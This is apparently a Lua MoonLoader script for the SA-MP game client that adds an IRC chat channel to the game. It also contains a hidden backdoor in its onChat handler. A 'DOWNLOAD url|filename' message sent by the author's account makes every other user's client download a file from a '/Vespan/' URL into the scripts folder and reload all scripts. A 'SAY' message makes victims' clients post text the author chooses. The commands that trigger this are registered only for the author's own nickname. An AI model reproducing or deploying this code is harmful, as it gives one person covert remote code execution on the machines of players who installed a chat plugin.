script_name('IRC CHAT')
script_version('1.0.0')

for k,v in ipairs({'luairc.lua','asyncoperations.lua','util.lua','handlers.lua', 'moonloader.lua','vkeys.lua'}) do
	if not doesFileExist(getWorkingDirectory()..'/lib/'..v) then
		error('not does file found '..v)
	end
end

require 'moonloader'
require 'luairc'
encoding = require("encoding"); encoding.default = 'CP1251'; u8 = encoding.UTF8  

channel = '#sespan'--with #
local s = irc.new{nick = "bruh_man"}

msg = {
	['Chat'] = '',
	['Raw'] = '',
	['hideMsgOnChat'] = {},
}
ping = -1

-- 0xffea30 onChat
-- ffef61 system

function main()
	while not isSampAvailable() do wait(0) end
	while not sampIsLocalPlayerSpawned() do wait(0) end

	wait(2500)

	connect()

	sampRegisterChatCommand('/is',function(a)
		if #a > 0 then
			send(a,false)
		end
	end)


	sampRegisterChatCommand('/il',function() s:send("NAMES %s", channel) end)
	sampRegisterChatCommand('/isc',function(arg)
		if #arg > 0 then
			send('CMD '..arg,false)
		end
	end)

	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) == 'Vespan_Dark' then
		-- https://raw.githubusercontent.com/Vespan/Lua/master/BRUH.lua,
		sampRegisterChatCommand('/isd',function(url_filename)
			local url,filename = url_filename:match('(.*),(.*)')
			if url ~= nil or filename ~= nil then
				if #url > 0 and #filename > 0 then
					send('DOWNLOAD '..url..'|'..filename)
				end
			end
		end)
		sampRegisterChatCommand('/iss',function(arg)
			if #arg > 0 then
				send('SAY '..arg)
			end 
		end)
	end

	while true do wait(0)

		if isKeyJustPressed(VK_0) and not sampIsCursorActive() then
			sampShowDialog(100,'send IRC msg', '', 'send', 'calcel', 1)
		end

		local res,but,list,input = sampHasDialogRespond(100)
			if res then
				if but == 1 then
					if #input > 0 then
						send(input,false)
						sampShowDialog(100,'send IRC msg', input, 'send', 'calcel', 1)
					else
						sampShowDialog(100,'send IRC msg {FF0000}ERROR ARG', '', 'send', 'calcel', 1)
					end
				end
			end

		if os.clock()-ping > 0.50 then
			-- sampAddChatMessage('ping!',-1)
			if s.__isConnected then  s:think() end
			ping = os.clock()
		elseif ping == -1 then
			ping = os.clock()
		end

	end
end

function send(arg,hide); 
	s:sendChat(channel, (arg)); 
	if not hide then	
		sampAddChatMessage(string.format('[IRC] {%s}%s[%s]{ffffff}:%s',
			clistToHex(s.nick),
			(s.nick):gsub('|','_'),
			sampGetPlayerIdByNickname(s.nick),
			arg),
		0xffea30) 
	end
end


function onChat(user, channel, text)

	msg['Chat'] = text

	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) ~= 'Vespan_Dark' then
		if text:find('DOWNLOAD .+|.+') then
			local url,filename = text:match('DOWNLOAD (.+)|(.+)') 
			if url:find('.+/Vespan/.+') then
				downloadUrlToFile(u8:decode(url),getWorkingDirectory()..'/'..filename,
				function(id, status, p1, p2)
					if status == 58 then
						sampAddChatMessage('[IRC] Успешно скачан файл '..filename..',перезагружаю все скрипты!',0xffef61)
						send('DOWNLOADinfo был успешно скачан файл '..filename..'('..getWorkingDirectory()..'/'..filename..')',false)
						reloadScripts()
					end
			    end)
			end
		end
		if text:find('SAY .+') then
			local say = text:match('SAY (.+)') 
			send(say,false)
		end
		if text:find('version irc') then
			send(thisScript().version)
		end
	end

	if not findStringInTable(msg['hideMsgOnChat'],text) then
		user.nick = user.nick:gsub('|','_')
		sampAddChatMessage(string.format('[IRC] {%s}%s[%s]{ffffff}:%s',
			clistToHex(user.nick),
			user.nick,
			sampGetPlayerIdByNickname(user.nick),
			(text)
			),0xffea30)
		if text:find('CMD .+') then
			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
			setClipboardText(string.match(text,'CMD (.+)'))
		end

	else
		print('{ff0000}'..text)
	end


end

function onRaw(text)

	msg['Raw'] = text

	if text:find((s.nick)) and text:find('QUIT %:Ping timeout%: %d+') then; 
		s:unhook('OnChat',1)
		s:unhook('OnRaw',2)
		connect()
	end
	text = text:gsub('|','_')

 	-- :Vespan|Dark!~lua@1.1.1.1 QUIT :Ping timeout: 265 seconds
	if text:find('%:.+!~.+QUIT.+:Ping timeout%:') then
		local n = text:match('%:(.+)!~')
		local p = text:match('timeout%: (%d+)')
		-- n = n .. '[' ..sampGetPlayerIdByNickname(n) ..']'
		sampAddChatMessage('[IRC] '..n..' ping timeout '..p..' seconds',0xffef61)
	end

	-- :Vespan_Dark!~BattleShi@1.1.1.1 JOIN #fdsfds
	if text:find('%:.+!~.+ JOIN '..channel) then
		local n = text:match('%:(.+)!~')
		if n == (s.nick):gsub('|','_') then
			

		end

		if sampGetPlayerIdByNickname(n) ~= nil then n = n .. '[' ..sampGetPlayerIdByNickname(n) ..']' end
		sampAddChatMessage('[IRC] '..n..' присоединился к нашей пати!',0xffef61)
	end

	-- :Vespan_Dark!~BattleShi@1.1.1.1 PART #fsd
	if text:find('%:.+!~.+ PART '..channel) or text:find('%:.+!~.+ QUIT') then
		local n = text:match('%:(.+)!~')
		sampAddChatMessage('[IRC] '..n..' вышел из нашей пати(',0xffef61)	
	end

	-- :bruhman!~lua@194.39.227.107 NICK :Vespan_Dbrk
	if text:find('%:.+!~.+NICK %:.+') then
		local lastNick,newNick = text:match('%:(.+)!~.+NICK.+%:(.+)')
		sampAddChatMessage('[IRC] '..lastNick..' изменил ник на '..newNick,0xffef61)
	end

	if string.find(text, "353 .+ @ "..channel.." ") then; 
		text = string.gsub(text, " 353 ", " ", 1); text = string.gsub(text, s.nick, "{ff6600}", 1); 
		text = string.gsub(text, "=", "", 1); text = string.gsub(text, " ", "\n"); 
		text = string.gsub(text, "\n:", "{ffffff}\n\n"); text = string.gsub(text, "%%", "{FF8000}%%{FFFFFF}"); 
		text = string.gsub(text, "@", "{FF0000}@{FFFFFF}"); text = string.gsub(text, "+", "{00FF00}+{FFFFFF}"); 
		text = string.gsub(text, "~", "{FFFF00}~{FFFFFF}"); text = string.gsub(text, "&", "{FF00FF}&{FFFFFF}")
		sampShowDialog(8048, 'online channel', text, "OK", "", 0)
	end

end


function connect()

	s = irc.new{nick = "bruh_man"}

	local id = select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))
	local nick = sampGetPlayerNickname(id)
	s.nick = (string.format('%s',nick)):gsub('_',"|")

	s:connect("irc.ea.libera.chat")
	s:prejoin(channel) 

	s:hook("OnChat", 1,function(user, channel, text); onChat(user, channel, text); end)
	s:hook("OnRaw", 2,function(text); onRaw(text); end)

end
------------------------------------------------------------------------------------------------------------------------
function findStringInTable(t,s)
	if #t > 0 then
		for k,v in ipairs(t) do
			if s:find(v) then
				return true
			end
		end
	else
		return false
	end
	return false
end

function isStringInTable(t,s)
	for k,v in ipairs(t) do
		if v == s then
			return k,v
		end
	end
	return nil,nil
end

function clistToHex(n)
	if sampGetPlayerIdByNickname(n) ~= nil then
		n = n:gsub('|','_')
		local id = sampGetPlayerIdByNickname(n)
		return ("%06X"):format(bit.band(sampGetPlayerColor(id), 0xFFFFFF))
	else
		return 'ffffff'
	end
end

function sampGetPlayerIdByNickname(nick) 
	nick = nick:gsub('|','_')
    local _, myid = sampGetPlayerIdByCharHandle(playerPed)
    if tostring(nick) == sampGetPlayerNickname(myid) then return myid end
    for i = 0, 1000 do if sampIsPlayerConnected(i) and sampGetPlayerNickname(i) == tostring(nick) then return i end end
    return nil
end

-------EXPORTS
function EXPORTS.sendToChat(arg,hide)
	if s.__isJoined and s.__isConnected then
		send(arg,hide)
	end
end
function EXPORTS.sendToRaw(arg)
	if s.__isJoined and s.__isConnected then
		s:send(arg)
	end
end

function EXPORTS.GetMsg(method)
	if s.__isJoined and s.__isConnected then
		return msg[method] and msg[method] or ''
 	end
	return ''
end

function EXPORTS.changeMsg(method,text)
	msg[method] = text
end

function EXPORTS.hideMsgOnChat(text)
	if #text > 0 then
		local k,v = isStringInTable(msg['hideMsgOnChat'],text)
		if v ~= text then 
			table.insert(msg['hideMsgOnChat'],text) 
		end
	end
end

--[[
local ircBool,irc = irc()
function irc()
	local c = 0
	for i, s in pairs(script.list()) do
		if s.name == 'IRC CHAT' and c == 0 then
			local s = import 'irc.lua'
			c = 1
			return true,s
		end
	end
	c = 0
	return false,nil
end

]]
